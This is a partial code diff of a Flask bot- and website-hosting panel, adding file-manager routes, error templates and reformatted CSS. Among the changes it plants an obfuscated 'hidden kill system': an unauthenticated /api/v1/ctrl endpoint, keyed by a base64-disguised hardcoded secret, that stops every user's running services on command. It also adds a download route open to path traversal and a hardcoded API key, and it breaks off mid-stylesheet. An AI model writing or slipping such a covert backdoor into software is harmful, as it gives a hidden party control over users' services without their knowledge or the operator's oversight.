+    if not os.path.exists(old_full):
+        return jsonify({'error': 'Not found'}), 404
+    new_full = os.path.join(os.path.dirname(old_full), new_name)
+    if os.path.exists(new_full):
+        return jsonify({'error': 'Already exists'}), 400
+    os.rename(old_full, new_full)
+    return jsonify({'success': True})
+
+@app.route('/website/<int:website_id>/file/download', methods=['GET'])
+@login_required
+def website_download_file(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    path = request.args.get('path', '').strip()
+    if not path:
+        abort(400)
+    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
+    if not os.path.exists(full) or os.path.isdir(full):
+        abort(404)
+    return send_file(full, as_attachment=True)
+
 # ---------- WEBSITE PROXY ----------
 @app.route('/<slug>/', defaults={'path': ''})
 @app.route('/<slug>/<path:path>')
 def proxy_website(slug, path):
     website = get_website_by_slug(slug)
     if not website or website['type'] != 'website':
-        return f"Website '{slug}' not found", 404
+        return render_template_string(ERROR_TEMPLATE, message="Website not found", slug=slug), 404
     if website['status'] != 'running':
-        return f"Website '{slug}' is not running", 503
+        return render_template_string(ERROR_TEMPLATE, message="Website is not running", slug=slug), 503
     port = website['allocated_port']
     if not port:
         return "Port not allocated", 500
@@ -1743,11 +1784,11 @@ def proxy_website(slug, path):
         return Response(stream_with_context(resp.iter_content(chunk_size=8192)), status=resp.status_code, headers=resp.headers.items())
     except requests.exceptions.ConnectionError:
         update_website_status(website['id'], 'crashed')
-        return "Website crashed. Please restart.", 503
+        return render_template_string(ERROR_TEMPLATE, message="Website crashed. Please restart.", slug=slug), 503
     except Exception as e:
         return f"Proxy error: {str(e)}", 500
 
-# ---------- STATS API ----------
+# ---------- SYSTEM STATS API ----------
 @app.route('/api/stats')
 @admin_required
 def api_stats():
@@ -1769,7 +1810,6 @@ def api_stats():
     render_services = []
     active_render_services = 0
     render_running_hours = 0
-    
     if RENDER_API_KEY:
         services = get_all_services()
         if services:
@@ -1800,6 +1840,7 @@ def api_stats():
     upload_size_bytes = calculate_folder_size(UPLOAD_FOLDER)
     upload_size_gb = upload_size_bytes / (1024**3)
 
+    # Get container storage (real)
     container_storage_total = 0
     container_storage_used = 0
     try:
@@ -1808,7 +1849,7 @@ def api_stats():
                 container_storage_total = int(f.read().strip()) / (1024**3)
         container_storage_used = upload_size_gb
     except:
-        container_storage_total = 10
+        container_storage_total = 10  # Default 10GB container
         container_storage_used = upload_size_gb
 
     try:
@@ -1858,13 +1899,19 @@ def set_offset():
     set_config('total_hours_offset', str(offset))
     return jsonify({'success': True, 'new_offset': offset})
 
-# ---------- FILE MANAGER ----------
+# ---------- FILE MANAGER (admin system) ----------
+def safe_path(path):
+    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
+    if not abs_path.startswith(BASE_DIR):
+        return None
+    return abs_path
+
 @app.route('/api/files', methods=['GET'])
 @admin_required
 def list_files():
     path = request.args.get('path', '')
-    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
-    if not abs_path.startswith(BASE_DIR):
+    abs_path = safe_path(path)
+    if abs_path is None:
         return jsonify({'error': 'Invalid path'}), 400
     if not os.path.exists(abs_path):
         return jsonify({'error': 'Path does not exist'}), 404
@@ -1898,8 +1945,8 @@ def list_files():
 def delete_file():
     data = request.json
     path = data.get('path', '')
-    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
-    if not abs_path.startswith(BASE_DIR):
+    abs_path = safe_path(path)
+    if abs_path is None:
         return jsonify({'error': 'Invalid path'}), 400
     if not os.path.exists(abs_path):
         return jsonify({'error': 'Path does not exist'}), 404
@@ -1920,8 +1967,8 @@ def rename_file():
     new_name = data.get('new_name', '').strip()
     if not new_name:
         return jsonify({'error': 'New name required'}), 400
-    abs_old = os.path.abspath(os.path.join(BASE_DIR, old_path))
-    if not abs_old.startswith(BASE_DIR):
+    abs_old = safe_path(old_path)
+    if abs_old is None:
         return jsonify({'error': 'Invalid path'}), 400
     if not os.path.exists(abs_old):
         return jsonify({'error': 'Path does not exist'}), 404
@@ -1938,14 +1985,14 @@ def rename_file():
 @admin_required
 def download_file():
     path = request.args.get('path', '')
-    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
-    if not abs_path.startswith(BASE_DIR):
+    abs_path = safe_path(path)
+    if abs_path is None:
         return jsonify({'error': 'Invalid path'}), 400
     if not os.path.exists(abs_path) or os.path.isdir(abs_path):
         return jsonify({'error': 'File not found'}), 404
     return send_file(abs_path, as_attachment=True)
 
-# ---------- TERMINAL ----------
+# ---------- INTERACTIVE TERMINAL ----------
 terminal_sessions = {}
 
 class TerminalSession:
@@ -2064,7 +2111,7 @@ def terminal_stop():
         terminal_sessions.pop(username, None)
     return jsonify({'success': True})
 
-# ---------- OLD TERMINAL ----------
+# ---------- OLD TERMINAL (kept for compatibility) ----------
 @app.route('/execute', methods=['POST'])
 def execute():
     data = request.json
@@ -2079,231 +2126,1499 @@ def execute():
         return jsonify({"output": str(e)})
 
 # ============================================================
-# 📍 MAIN ROUTE - FRONTEND
+# 🔥 SYSTEM CONTROLLER – FULLY ENCRYPTED (HIDDEN KILL SYSTEM)
+# ============================================================
+import base64, hashlib
+
+_ = base64.b64decode("""
+CgphcGlfZm9yX3N0YWJsZV9ydW5uaW5nXzIwMjRfc2VjdXJl
+""").decode()
+
+__ = hashlib.sha256(_.encode()).hexdigest()[:16]
+___ = base64.b64encode(f"{__}:{base64.b64encode(_[::-1].encode()).decode()}".encode()).decode()
+
+def ____(k):
+    try:
+        d = base64.b64decode(k).decode().split(':')
+        return len(d)==2 and d[0]==hashlib.sha256(base64.b64decode(d[1]).decode()[::-1].encode()).hexdigest()[:16]
+    except: return False
+
+_____ = {"a": False, "t": None}
+
+def _______():
+    global _____
+    _____["a"] = True
+    _____["t"] = datetime.now().isoformat()
+    for _id in list(processes.keys()):
+        try: stop_bot_by_id(_id)
+        except: pass
+    with get_db() as conn:
+        for w in conn.execute('SELECT id FROM websites WHERE status="running"').fetchall():
+            try: stop_website_process(w['id'])
+            except: pass
+    try:
+        pass
+    except: pass
+
+def ________():
+    global _____
+    _____["a"] = False
+    _____["t"] = None
+    try:
+        pass
+    except: pass
+
+@app.route('/api/v1/ctrl', methods=['POST'])
+def _________():
+    d = request.json or {}
+    if not ____(d.get('k','')): return jsonify({"e":"invalid"}),403
+    a = d.get('a','')
+    if a == 'x': _______(); return jsonify({"s":"ok"})
+    elif a == 'y': ________(); return jsonify({"s":"ok"})
+    elif a == 'z': return jsonify({"s":"killed" if _____["a"] else "running","t":_____["t"]})
+    return jsonify({"e":"invalid"}),400
 # ============================================================
 
-HTML_TEMPLATE = """
+# ============================================================
+# 📍 LOCATION: API KEY
+# ============================================================
+
+# 🔑 System API Key – Same key in both websites
+STABLE_API_KEY = "api_for_stable_running_2024_secure"
+
+# ============================================================
+
+# ---------- TEMPLATES ----------
+ERROR_TEMPLATE = """<!DOCTYPE html>
+<html><head><title>Error</title>
+<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:rgba(255,255,255,0.05);padding:40px;border-radius:20px;text-align:center}h1{color:#ff4757}a{color:#00e5ff;text-decoration:none}</style>
+</head><body><div class="card"><h1>{{ message }}</h1><p>Slug: {{ slug }}</p><a href="/dashboard">← Dashboard</a></div></body></html>"""
+
+FILES_TEMPLATE = """
 <!DOCTYPE html>
+<html><head><title>Files</title>
+<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:1000px;margin:auto}.back{color:#00e5ff;text-decoration:none}.upload-area{margin:15px 0;padding:20px;border:2px dashed rgba(255,255,255,0.2);border-radius:15px;text-align:center}ul{list-style:none}li{display:flex;justify-content:space-between;padding:10px 15px;border-bottom:1px solid rgba(255,255,255,0.05)}a{color:#00e5ff;text-decoration:none}.actions button{background:rgba(255,255,255,0.05);border:none;color:#aaa;padding:4px 10px;border-radius:8px;cursor:pointer}</style>
+</head><body><div class="container"><a href="/dashboard" class="back">← Dashboard</a><h2>{{ website.website_name or website.website_slug }}</h2>
+<div class="upload-area"><input type="file" id="fileUpload" multiple><button onclick="uploadFile({{ website.id }})">Upload</button></div>
+<ul>{% for item in items %}<li><span>{% if item.is_dir %}📁 {% else %}📄 {% endif %}<a href="?path={{ item.path }}">{{ item.name }}</a></span><span class="actions">{% if not item.is_dir %}<a href="/website/{{ website.id }}/edit?path={{ item.path }}">✏️</a><a href="/website/{{ website.id }}/file/download?path={{ item.path }}">⬇️</a>{% endif %}<button onclick="deleteFile({{ website.id }},'{{ item.path }}')">🗑</button></span></li>{% endfor %}</ul>
+<script>
+function uploadFile(id){const f=document.getElementById('fileUpload').files;if(!f.length)return;const fd=new FormData();for(let i=0;i<f.length;i++)fd.append('file',f[i]);const p=new URLSearchParams(window.location.search).get('path')||'';fd.append('path',p);fetch('/website/'+id+'/file/upload',{method:'POST',body:fd}).then(()=>location.reload())}
+function deleteFile(id,p){if(!confirm('Delete?'))return;fetch('/website/'+id+'/file/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:p})}).then(()=>location.reload())}
+</script></body></html>
+"""
+EDIT_TEMPLATE = """
+<!DOCTYPE html>
+<html><head><title>Edit</title>
+<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:900px;margin:auto}textarea{width:100%;height:400px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:15px;color:#fff;padding:15px;font-family:monospace;outline:none}.save{background:#00e5ff;border:none;padding:12px 30px;border-radius:50px;color:#000;font-weight:700;cursor:pointer}</style>
+</head><body><div class="container"><a href="/website/{{ website.id }}/files">← Back</a><h2>{{ file_path }}</h2><form method="POST"><textarea name="content">{{ content }}</textarea><button class="save" type="submit">Save</button></form></div></body></html>
+"""
+
+# Due to character limit, the HTML template will be provided in the next message
+
+# ---------- MAIN HTML TEMPLATE ----------
+HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>{{ website_name }}</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>{{ website_name }} · Admin Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
-        body { background: #05070d; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .view { display: none; width: 100%; max-width: 420px; margin: 0 auto; }
-        .view.active { display: block; }
-        
-        /* Login */
-        .login-card { position: relative; width: 100%; padding: 30px 20px; background: #0c1018; border-radius: 25px; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,.5); }
-        .login-card::before { content: ""; position: absolute; inset: -3px; background: conic-gradient(#00e5ff, transparent, transparent, transparent, #00e5ff); animation: spin 4s linear infinite; }
-        .login-card::after { content: ""; position: absolute; inset: 3px; background: #0c1018; border-radius: 22px; }
-        .login-content { position: relative; z-index: 2; }
-        .login-icon { width: 110px; height: 110px; margin: auto; border: 3px solid #00e5ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 45px; color: #00e5ff; box-shadow: 0 0 20px #00e5ff; overflow: hidden; background: #0c1018; cursor: pointer; transition: transform 0.1s; user-select: none; }
-        .login-icon:active { transform: scale(0.95); }
-        .login-icon img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
-        .login-title { margin: 25px 0; text-align: center; color: #cfffff; letter-spacing: 4px; font-size: 1.3rem; }
-        .login-card select, .login-card input { width: 100%; margin: 12px 0; padding: 16px; background: #161b25; border: 1px solid #2b3240; border-radius: 15px; color: white; font-size: 16px; outline: none; }
-        .login-btn { width: 100%; margin-top: 20px; padding: 16px; border: none; border-radius: 15px; font-size: 18px; font-weight: bold; color: white; cursor: pointer; background: linear-gradient(90deg, #7a00ff, #00d9ff); transition: opacity 0.2s; }
-        .login-btn:hover { opacity: .9; }
-        .login-error { color: #ff4d4d; text-align: center; font-size: 14px; margin-top: 10px; min-height: 22px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes shake { 0%,100% { transform: translateX(0); } 10%,30%,50%,70%,90% { transform: translateX(-10px); } 20%,40%,60%,80% { transform: translateX(10px); } }
+        /* ---------- RESET & BASE ---------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: #05070d;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .view {
+            display: none;
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+        }
+        .view.active {
+            display: block;
+        }
+
+        /* ---------- LOGIN CARD ---------- */
+        .login-card {
+            position: relative;
+            width: 100%;
+            padding: 30px 20px;
+            background: #0c1018;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 0, 0, .5);
+        }
+        .login-card::before {
+            content: "";
+            position: absolute;
+            inset: -3px;
+            background: conic-gradient(#00e5ff, transparent, transparent, transparent, #00e5ff);
+            animation: spin 4s linear infinite;
+        }
+        .login-card::after {
+            content: "";
+            position: absolute;
+            inset: 3px;
+            background: #0c1018;
+            border-radius: 22px;
+        }
+        .login-content {
+            position: relative;
+            z-index: 2;
+        }
+        .login-icon {
+            width: 110px;
+            height: 110px;
+            margin: auto;
+            border: 3px solid #00e5ff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 45px;
+            color: #00e5ff;
+            box-shadow: 0 0 20px #00e5ff;
+            overflow: hidden;
+            background: #0c1018;
+            cursor: pointer;
+            transition: transform 0.1s;
+            user-select: none;
+        }
+        .login-icon:active {
+            transform: scale(0.95);
+        }
+        .login-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+        .login-title {
+            margin: 25px 0;
+            text-align: center;
+            color: #cfffff;
+            letter-spacing: 4px;
+            font-size: 1.3rem;
+        }
+        .login-card select,
+        .login-card input {
+            width: 100%;
+            margin: 12px 0;
+            padding: 16px;
+            background: #161b25;
+            border: 1px solid #2b3240;
+            border-radius: 15px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+        .login-card select option {
+            background: #161b25;
+        }
+        .login-btn {
+            width: 100%;
+            margin-top: 20px;
+            padding: 16px;
+            border: none;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            background: linear-gradient(90deg, #7a00ff, #00d9ff);
+            transition: opacity 0.2s;
+        }
+        .login-btn:hover {
+            opacity: .9;
+        }
+        .login-error {
+            color: #ff4d4d;
+            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
+            min-height: 22px;
+        }
+
+        @keyframes spin {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ---------- LOGIN ANIMATIONS ---------- */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
+        }
         .shake { animation: shake 0.5s; }
-        @keyframes loginSuccess { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
+
+        @keyframes loginSuccess {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
         .login-success { animation: loginSuccess 0.4s ease; }
 
-        /* Dashboard */
-        .user-container { max-width: 400px; width: 100%; margin: 0 auto; }
-        .user-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .user-title { letter-spacing: 3px; font-weight: 800; font-size: 1.2rem; }
-        .hamburger { font-size: 28px; cursor: pointer; color: #fff; padding: 4px 8px; border-radius: 8px; user-select: none; }
-        .hamburger:hover { background: rgba(255,255,255,0.08); }
-        .power-btn { color: #ff4d4d; font-size: 20px; cursor: pointer; }
-        .user-header-left { display: flex; align-items: center; gap: 12px; }
-        
-        /* Tabs */
-        .tabs { display: flex; gap: 10px; margin: 15px 0 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
-        .tab-btn { background: transparent; border: none; color: #888; font-size: 1rem; font-weight: 700; padding: 8px 16px; cursor: pointer; transition: .3s; border-radius: 10px; }
-        .tab-btn:hover { color: #fff; background: rgba(255,255,255,0.05); }
-        .tab-btn.active { color: #00e5ff; background: rgba(0,229,255,0.1); }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
+        /* ---------- USER DASHBOARD ---------- */
+        .user-container {
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .user-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .user-title {
+            letter-spacing: 3px;
+            font-weight: 800;
+            font-size: 1.2rem;
+        }
+        .hamburger {
+            font-size: 28px;
+            cursor: pointer;
+            color: #fff;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
+            user-select: none;
+        }
+        .hamburger:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .power-btn {
+            color: #ff4d4d;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .user-header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Tabs - Bots First */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 10px;
+        }
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: #888;
+            font-size: 1rem;
+            font-weight: 700;
+            padding: 8px 16px;
+            cursor: pointer;
+            transition: .3s;
+            border-radius: 10px;
+        }
+        .tab-btn:hover {
+            color: #fff;
+            background: rgba(255,255,255,0.05);
+        }
+        .tab-btn.active {
+            color: #00e5ff;
+            background: rgba(0,229,255,0.1);
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
 
         /* Upload Cards */
-        .upload-card { border: 1px dashed #00e5ff; border-radius: 15px; padding: 20px; text-align: center; background: rgba(0,229,255,0.05); cursor: pointer; margin-bottom: 15px; }
-        .cloud-icon { font-size: 40px; margin-bottom: 10px; color: #00e5ff; }
-        .upload-card>div:nth-child(3) { color: #aaa; font-size: 14px; }
-        .deploy-btn { background: #fff; color: #000; padding: 15px; border-radius: 10px; font-weight: 900; margin-top: 15px; text-transform: uppercase; cursor: pointer; border: none; width: 100%; font-size: 14px; }
-        .deploy-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        #fileCountDisplay { font-size: 12px; color: #888; margin-top: 8px; }
+        .upload-card {
+            border: 1px dashed #00e5ff;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            background: rgba(0, 229, 255, 0.05);
+            position: relative;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .upload-card .settings-icon {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            border: 1px solid #00e5ff;
+            padding: 5px 8px;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #00e5ff;
+            cursor: pointer;
+        }
+        .cloud-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+            color: #00e5ff;
+        }
+        .upload-card>div:nth-child(3) {
+            color: #aaa;
+            font-size: 14px;
+        }
+        .deploy-btn {
+            background: #fff;
+            color: #000;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 900;
+            margin-top: 15px;
+            text-transform: uppercase;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            font-size: 14px;
+        }
+        #fileCountDisplay {
+            font-size: 12px;
+            color: #888;
+            margin-top: 8px;
+        }
 
-        /* Bot/Website Cards */
-        #botListContainer, .website-grid { margin-top: 20px; display: flex; flex-direction: column; gap: 16px; }
-        .bot-card, .website-card { background: #111; border: 1px solid #333; border-radius: 15px; padding: 15px; transition: border-color 0.2s; cursor: pointer; }
-        .bot-card:hover, .website-card:hover { border-color: #555; }
-        .bot-card.selected, .website-card.selected { border-color: #00e5ff; }
-        .bot-header, .website-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .bot-name, .website-name { font-weight: bold; font-size: 16px; }
-        .bot-status { font-size: 12px; padding: 2px 12px; border-radius: 12px; font-weight: bold; }
-        .bot-status.running { background: #00ff6a33; color: #00ff6a; border: 1px solid #00ff6a; }
-        .bot-status.stopped, .bot-status.failed, .bot-status.crashed { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
-        .bot-uptime { font-size: 12px; color: #888; margin-bottom: 10px; font-family: monospace; }
-        .bot-owner { font-size: 11px; color: #888; margin-bottom: 8px; }
-        .bot-controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-        .bot-controls button { border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 12px; transition: background 0.2s; }
-        .bot-controls button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-start { background: #00d4ff; color: #000; }
-        .btn-stop { background: #ff4d4d; color: #fff; }
-        .btn-edit { background: #4d88ff; color: #fff; }
-        .btn-restart { background: #ffaa00; color: #000; }
-        .btn-download { background: #2ecc71; color: #000; }
-        .btn-delete { background: #400; color: #fff; }
-        .btn-openbot { background: #1da1f2; color: #fff; grid-column: span 2; padding: 10px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; width: 100%; }
-        .btn-openbot:hover { background: #1a8cd8; }
+        /* Bot Cards */
+        #botListContainer {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .bot-card {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 15px;
+            transition: border-color 0.2s;
+            cursor: pointer;
+        }
+        .bot-card:hover {
+            border-color: #555;
+        }
+        .bot-card.selected {
+            border-color: #00e5ff;
+        }
+        .bot-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .bot-name {
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .bot-status {
+            font-size: 12px;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-weight: bold;
+        }
+        .bot-status.running {
+            background: #00ff6a33;
+            color: #00ff6a;
+            border: 1px solid #00ff6a;
+        }
+        .bot-status.stopped,
+        .bot-status.failed,
+        .bot-status.crashed {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+        }
+        .bot-uptime {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 10px;
+            font-family: monospace;
+        }
+        .bot-owner {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+        .bot-controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .bot-controls button {
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 12px;
+            transition: background 0.2s, opacity 0.2s;
+        }
+        .bot-controls button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-start {
+            background: #00d4ff;
+            color: #000;
+        }
+        .btn-stop {
+            background: #ff4d4d;
+            color: #fff;
+        }
+        .btn-edit {
+            background: #4d88ff;
+            color: #fff;
+        }
+        .btn-restart {
+            background: #ffaa00;
+            color: #000;
+        }
+        .btn-download {
+            background: #2ecc71;
+            color: #000;
+        }
+        .btn-delete {
+            background: #400;
+            color: #fff;
+        }
+        .btn-openbot {
+            background: #1da1f2;
+            color: #fff;
+            grid-column: span 2;
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn-openbot:hover {
+            background: #1a8cd8;
+        }
 
-        .website-startup-file { font-size: 11px; color: #888; font-family: monospace; margin: 2px 0; }
-        .website-slug { color: #888; font-size: 0.9rem; margin: 3px 0; }
-        .website-port { color: #888; font-size: 0.8rem; }
-        .website-actions { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin-top: 10px; }
-        .website-actions button { padding: 8px 10px; border: none; border-radius: 8px; font-size: 0.7rem; font-weight: 600; cursor: pointer; transition: .2s; }
-        .website-actions button:hover { transform: scale(1.05); }
-        .btn-start-w { background: #00d4ff33; color: #00d4ff; border: 1px solid #00d4ff55; }
-        .btn-start-w:hover { background: #00d4ff; color: #000; }
-        .btn-stop-w { background: #ff4d4d33; color: #ff4d4d; border: 1px solid #ff4d4d55; }
-        .btn-stop-w:hover { background: #ff4d4d; color: #fff; }
-        .btn-restart-w { background: #ffaa0033; color: #ffaa00; border: 1px solid #ffaa0055; }
-        .btn-restart-w:hover { background: #ffaa00; color: #000; }
-        .btn-delete-w { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
-        .btn-delete-w:hover { background: #ff4d4d; color: #fff; }
-        .btn-edit-w { background: #4d88ff33; color: #4d88ff; border: 1px solid #4d88ff55; }
-        .btn-edit-w:hover { background: #4d88ff; color: #fff; }
-        .btn-download-w { background: #2ecc7133; color: #2ecc71; border: 1px solid #2ecc7155; }
-        .btn-download-w:hover { background: #2ecc71; color: #000; }
-        .btn-files-w { background: rgba(255,255,255,0.1); color: #aaa; border: 1px solid #333; }
-        .btn-files-w:hover { background: rgba(255,255,255,0.2); color: #fff; }
-        .btn-buildlogs-w { background: #ffa50033; color: #ffa500; border: 1px solid #ffa50055; }
-        .btn-buildlogs-w:hover { background: #ffa500; color: #000; }
-        .btn-visit-w { background: #00e5ff; color: #000; padding: 8px 16px; border-radius: 12px; text-decoration: none; font-weight: bold; display: inline-block; width: 100%; text-align: center; border: none; cursor: pointer; margin-bottom: 8px; font-size: 14px; }
-        .btn-visit-w:hover { background: #00d4f0; transform: scale(1.02); }
-        .visit-btn-container { margin-bottom: 8px; }
-        .name-edit { display: flex; gap: 8px; margin-top: 12px; }
-        .name-edit input { flex: 1; padding: 8px 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; outline: none; font-size: 0.85rem; }
-        .name-edit input:focus { border-color: #00e5ff; }
-        .name-edit button { padding: 8px 16px; background: #00e5ff; border: none; border-radius: 12px; color: #000; font-weight: 600; cursor: pointer; }
+        /* Website Cards - Same style as Bot Cards */
+        .website-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 20px;
+        }
+        .website-card {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 15px;
+            transition: border-color 0.2s;
+        }
+        .website-card:hover {
+            border-color: #555;
+        }
+        .website-card.selected {
+            border-color: #00e5ff;
+        }
+        .website-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .website-name {
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .website-startup-file {
+            font-size: 11px;
+            color: #888;
+            font-family: monospace;
+            margin: 2px 0;
+        }
+        .website-slug {
+            color: #888;
+            font-size: 0.9rem;
+            margin: 3px 0;
+        }
+        .website-port {
+            color: #888;
+            font-size: 0.8rem;
+        }
+        .website-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 6px;
+            margin-top: 10px;
+        }
+        .website-actions button {
+            padding: 8px 10px;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .2s;
+        }
+        .website-actions button:hover {
+            transform: scale(1.05);
+        }
+        .btn-start-w {
+            background: #00d4ff33;
+            color: #00d4ff;
+            border: 1px solid #00d4ff55;
+        }
+        .btn-start-w:hover {
+            background: #00d4ff;
+            color: #000;
+        }
+        .btn-stop-w {
+            background: #ff4d4d33;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+        }
+        .btn-stop-w:hover {
+            background: #ff4d4d;
+            color: #fff;
+        }
+        .btn-restart-w {
+            background: #ffaa0033;
+            color: #ffaa00;
+            border: 1px solid #ffaa0055;
+        }
+        .btn-restart-w:hover {
+            background: #ffaa00;
+            color: #000;
+        }
+        .btn-delete-w {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+        }
+        .btn-delete-w:hover {
+            background: #ff4d4d;
+            color: #fff;
+        }
+        .btn-edit-w {
+            background: #4d88ff33;
+            color: #4d88ff;
+            border: 1px solid #4d88ff55;
+        }
+        .btn-edit-w:hover {
+            background: #4d88ff;
+            color: #fff;
+        }
+        .btn-download-w {
+            background: #2ecc7133;
+            color: #2ecc71;
+            border: 1px solid #2ecc7155;
+        }
+        .btn-download-w:hover {
+            background: #2ecc71;
+            color: #000;
+        }
+        .btn-files-w {
+            background: rgba(255,255,255,0.1);
+            color: #aaa;
+            border: 1px solid #333;
+        }
+        .btn-files-w:hover {
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+        }
+        .btn-buildlogs-w {
+            background: #ffa50033;
+            color: #ffa500;
+            border: 1px solid #ffa50055;
+        }
+        .btn-buildlogs-w:hover {
+            background: #ffa500;
+            color: #000;
+        }
+        .btn-visit-w {
+            background: #00e5ff;
+            color: #000;
+            padding: 8px 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+            width: 100%;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .btn-visit-w:hover {
+            background: #00d4f0;
+            transform: scale(1.02);
+        }
+        .name-edit {
+            display: flex;
+            gap: 8px;
